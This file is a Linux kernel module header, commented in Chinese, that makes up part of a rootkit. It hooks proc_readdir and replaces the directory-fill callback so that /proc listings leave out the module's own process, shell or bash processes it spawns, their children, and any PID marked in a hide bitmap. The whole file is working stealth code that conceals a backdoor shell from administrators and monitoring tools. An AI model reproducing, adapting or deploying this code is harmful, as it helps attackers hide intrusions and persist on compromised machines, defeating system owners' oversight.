/**
 * 进程隐藏和目录读取拦截头文件
 * 实现进程ID隐藏、proc目录读取拦截
 * 分析进程树结构，隐藏特定进程
 */

#ifndef PROC_ID_H
#define PROC_ID_H

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/pid_namespace.h>
#endif
#include <linux/init.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 25)
#include <linux/pid.h>
#endif
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/mman.h>

#include "config.h"

// 钩子表外部引用
extern hook_t _tbl[];

// 内核版本兼容性处理：filldir_t函数指针类型
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
// 新内核中filldir_t返回bool类型
static bool (*ptr_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
static int (*ptr_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
#endif

// proc目录读取函数声明
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
int __proc_readdir(struct file *file, struct dir_context *ctx);
#elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
int __proc_readdir( struct file *file, void *dirent, filldir_t filldir );
#endif

// 最大进程ID数量
#define MAX_PIDS 0x9000

// 进程隐藏位图 - 每个位表示一个进程ID的隐藏状态
char pids[MAX_PIDS / 8 + 1];

/**
 * 隐藏指定进程ID
 * 在位图中设置对应位
 * @param x 要隐藏的进程ID
 */
static inline void pid_hide(long x)
{
	// 检查进程ID是否超出范围
	if (x >= MAX_PIDS)
		return;

	// 设置对应位为1（隐藏）
	pids[x / 8] |= 1 << (x % 8);
}

/**
 * 显示指定进程ID
 * 在位图中清除对应位
 * @param x 要显示的进程ID
 */
static inline void pid_unhide(long x)
{
	if (x >= MAX_PIDS)
		return;

	// 清除对应位（显示）
	pids[x / 8] &= ~(1 << (x % 8));
}

/**
 * 检查进程ID是否被隐藏
 * @param x 要检查的进程ID
 * @return 1表示隐藏，0表示显示
 */
static inline char is_pid(long x)
{
	if (x >= MAX_PIDS)
		return 0;

	return pids[x / 8] & (1 << (x % 8));
}

//-----------------------------------------------------------------------------

// 内核版本兼容性宏定义
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 28)
#define get_task_uid(task) task->uid
#define get_task_parent(task) task->parent
#else
#define get_task_uid(task) task->cred->uid
#define get_task_parent(task) task->real_parent
#endif

// 进程树分析相关变量
static long _root = 0;    // 根进程ID
static long _sh = 0;      // shell进程ID

/**
 * 自定义目录读取回调函数
 * 分析进程树结构，自动隐藏特定进程
 * 支持不同内核版本的filldir_t类型
 */
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
// 新内核中filldir_t返回bool类型
static bool n_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
static int n_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
#endif
{
	char *endp;
	long pid;
	struct task_struct *_task;
	struct task_struct *tsk_parent;

	// 解析进程ID
	pid = simple_strtol(name, &endp, 10);
	if (pid >= 3)
	{
		rcu_read_lock();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
		_task = pid_task(find_pid_ns(pid, task_active_pid_ns(current)), PIDTYPE_PID);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 25)
		_task = pid_task(find_vpid(pid), PIDTYPE_PID);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
		_task = find_task_by_pid(pid);
#endif
		rcu_read_unlock();

		if (_task != NULL)
		{
			tsk_parent = get_task_parent(_task);
			
			// 情况1：进程的父进程是根进程，且父进程不是init(1)
			if (tsk_parent != NULL && tsk_parent->pid != 1 && tsk_parent->pid == _root && _root != 0)
			{
				debug(" 1. pid %ld  ppid %ld\n", (long)_task->pid, (long)tsk_parent->pid);

				// 检查是否是shell进程
				if (strstr(_task->comm, "sh") != NULL || strstr(_task->comm, "bash") != NULL)
				{
					debug("sh pid %ld  ppid %ld\n", (long)_task->pid, (long)tsk_parent->pid);
					_sh = _task->pid;
				}

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
				return true;
#else
				return 0;
#endif
			}

			// 情况2：进程的父进程是shell进程
			if (tsk_parent != NULL && tsk_parent->pid != 1 && tsk_parent->pid == _sh && _sh != 0)
			{
				debug(" 2. pid %ld  ppid %ld\n", (long)_task->pid, (long)tsk_parent->pid);
				// 隐藏这个进程
				pid_hide(pid);

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
				return true;
#else
				return 0;
#endif
			}

			// 情况3：进程名称匹配内核名称
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
			if (strstr(_task->comm, _kname) != NULL)
#endif
			{
				// 设置根进程ID
				_root = pid;

				// 先显示再隐藏，确保状态一致
				pid_unhide(pid);
				pid_hide(pid);

				debug(" 0. %ld  name:%s \n", pid, _task->comm);
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
				return true;
#else
				return 0;
#endif
			}
			
			// 情况4：进程已在隐藏列表中
			if (is_pid(pid))
			{
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
				return true;
#else
				return 0;
#endif
			}

		}
	}

	// 调用原始的filldir函数
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
	return ptr_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
	return ptr_filldir(__buf, name, namelen, offset, ino, d_type);
#endif
}

/**
 * 拦截proc目录读取函数（新内核版本）
 * 替换filldir回调函数，实现进程隐藏
 */
#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 10, 0)
int __proc_readdir(struct file *file, struct dir_context *ctx)
{
	int ret;
	hook_t *hk = NULL;
	int proc_readdir(struct file * file, struct dir_context * ctx);

	// 保存原始的filldir函数指针
	ptr_filldir = (filldir_t)ctx->actor;

	// 替换为自定义的filldir函数
	ctx->actor = (filldir_t)&n_filldir;

	// 获取钩子表项
	hk = &_tbl[1];

	// 调用原始的proc_readdir函数
	ret = ((typeof(proc_readdir) *)hk->stub_bak)(file, ctx);

	return ret;
}
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
/**
 * 拦截proc目录读取函数（老内核版本）
 * 替换filldir回调函数，实现进程隐藏
 */
int __proc_readdir(struct file *filp, void *dirent, filldir_t filldir)
{
	int result;
	hook_t *hk = NULL;
	int proc_readdir(struct file * file, void *dirent, filldir_t filldir);

	// 保存原始的filldir函数指针
	ptr_filldir = filldir;

	// 获取钩子表项
	hk = &_tbl[1];

	// 调用原始的proc_readdir函数，使用自定义的filldir
	result = ((typeof(proc_readdir) *)hk->stub_bak)(filp, dirent, n_filldir);

	return result;
}

#endif

#endif
